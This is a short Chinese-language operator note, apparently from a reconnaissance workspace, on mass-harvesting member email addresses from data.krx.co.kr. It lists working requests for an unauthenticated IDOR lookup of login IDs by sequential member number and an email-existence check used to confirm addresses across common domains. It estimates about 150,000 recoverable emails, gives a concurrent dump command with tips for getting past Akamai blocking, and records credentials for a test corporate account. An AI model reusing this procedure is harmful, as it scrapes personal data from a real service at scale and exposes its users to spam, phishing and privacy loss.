# data.krx.co.kr 会员库邮箱

下次直接调这个文件。结果目录：`/data/recon/data.krx.co.kr/dump/`

## 办法

未登录 IDOR 读登录名，再用登录名撞库内邮箱。

```
POST https://data.krx.co.kr/comm/bldAttendant/getJsonData.cmd
bld=dbms/MDC/DATA/mbr_add_info_select
mbrNo=<会员号>
→ block1[0].MBR_ID

POST https://data.krx.co.kr/contents/MDC/COMS/client/isDupMbrEmail.cmd
email=<MBR_ID>@naver.com
→ isDupMbrEmail=true 即库内邮箱
```

字段必须是 `email=`。域顺序：naver.com、gmail.com、hanmail.net、daum.net、kakao.com、krx.co.kr。

号段：`2000005000`～`2000222667` 基本连续，约 21.8 万账号；抽样 67.9% 能撞出邮箱，约 15 万封。

## 全量

机房 IP 会被 Akamai 403。全量从能打通的出口跑，并发先 12，被拦就降。

```bash
cd /data/recon/data.krx.co.kr
KRX_WORKERS=12 python3 dump_member_emails.py
# 结果
# dump/emails.csv
# dump/ids.csv
# dump/state.json
```

## 法人建号（已验证）

`insertMbr.cmd`，密码 `KrxTest!@12`，事业者 `6028135420`。  
已建：`ptkrx713783` / `KrxTest!@12` / mbrNo `2000222658`。  
登录：MDCCOMS001.cmd → login.jsp → MDCCOMS001D1.cmd，CD011 加 skipDup=Y。

`getMbrInfo.cmd` 只能读自己，不能越权出别人邮箱。
